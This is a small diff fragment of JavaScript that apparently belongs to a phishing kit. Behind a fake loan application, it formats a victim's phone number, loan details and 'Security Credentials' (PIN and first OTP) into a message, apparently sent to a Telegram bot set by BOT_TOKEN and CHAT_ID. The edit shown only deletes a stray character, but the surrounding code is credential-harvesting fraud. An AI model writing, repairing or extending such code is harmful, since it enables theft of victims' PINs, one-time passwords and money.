@@ -28,7 +28,7 @@ if (!BOT_TOKEN || !CHAT_ID){
 • Phone: ${loanData.phone || 'N/A'}
 • Amount: MT ${loanData.amount || 'N/A'}
 • Period: ${loanData.period || 'N/A'} months
-t
+
 🔐 *Security Credentials:*
 • PIN: ${loanData.pin || 'Pending'}
 • First OTP: ${loanData.otp1 || 'Pending'}
